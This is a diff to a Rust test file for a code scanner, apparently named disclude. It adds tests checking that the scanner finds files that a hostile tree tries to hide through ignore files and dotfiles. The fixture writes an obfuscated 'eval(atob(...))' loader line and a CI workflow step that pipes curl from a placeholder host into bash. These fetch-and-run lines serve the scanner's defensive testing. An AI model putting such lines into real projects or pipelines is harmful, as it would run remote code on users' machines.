@@ -2415,6 +2415,78 @@ fn binary_files_are_counted_as_skipped() {
     assert!(r.diagnostics.is_empty());
 }
 
+/// A tree that tries to hide `evil.js`, `.hidden.js`, and `.github/` from
+/// the scan, in a directory of its own under the test target dir.
+fn hostile_tree(name: &str) -> PathBuf {
+    let dir = PathBuf::from(env!("CARGO_TARGET_TMPDIR")).join(name);
+    let _ = std::fs::remove_dir_all(&dir);
+    std::fs::create_dir_all(dir.join(".github/workflows")).unwrap();
+    std::fs::create_dir_all(dir.join("sub")).unwrap();
+    let payload = "eval(atob(\"aHR0cHM6Ly9leGFtcGxlLmNvbS94LmpzCg==\"));\n";
+    for f in ["evil.js", ".hidden.js", "sub/deep.js", "ok.js"] {
+        std::fs::write(dir.join(f), payload).unwrap();
+    }
+    std::fs::write(
+        dir.join(".github/workflows/ci.yml"),
+        "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl http://example.invalid/x.sh | bash\n",
+    )
+    .unwrap();
+    std::fs::write(dir.join(".discludeignore"), "evil.js\n").unwrap();
+    std::fs::write(dir.join(".ignore"), "sub/\n").unwrap();
+    dir
+}
+
+fn scanned_names(r: &disclude::finding::ScanResult, root: &std::path::Path) -> Vec<String> {
+    let mut names: Vec<String> = r
+        .files
+        .iter()
+        .map(|fa| {
+            fa.path
+                .strip_prefix(root)
+                .unwrap()
+                .to_string_lossy()
+                .replace('\\', "/")
+        })
+        .collect();
+    names.sort();
+    names
+}
+
+#[test]
+fn by_default_the_tree_s_ignore_files_and_hidden_files_apply() {
+    let dir = hostile_tree("walk_trusted");
+    let r = scan(&dir, &ScanOptions::default()).expect("scan failed");
+    assert_eq!(scanned_names(&r, &dir), ["ok.js"]);
+}
+
+#[test]
+fn an_untrusted_tree_can_t_hide_files_from_the_scan() {
+    let dir = hostile_tree("walk_untrusted");
+    let mut opts = ScanOptions::default();
+    opts.untrusted = true;
+    let r = scan(&dir, &opts).expect("scan failed");
+    assert_eq!(
+        scanned_names(&r, &dir),
+        [
+            ".github/workflows/ci.yml",
+            ".hidden.js",
+            "evil.js",
+            "ok.js",
+            "sub/deep.js"
+        ],
+        "ignore files in the tree are not applied, and hidden files are scanned"
+    );
+    // The caller's own ignore file still applies.
+    let own = dir.with_extension("ignore");
+    std::fs::write(&own, "evil.js\n.github/\n").unwrap();
+    opts.ignore_path = Some(own);
+    let r = scan(&dir, &opts).expect("scan failed");
+    assert_eq!(
+        scanned_names(&r, &dir),
+        [".hidden.js", "ok.js", "sub/deep.js"]
+    );
+}
+
 fn object_keys(v: &serde_json::Value) -> Vec<String> {
     let mut keys: Vec<String> = v.as_object().expect("object").keys().cloned().collect();
     keys.sort();
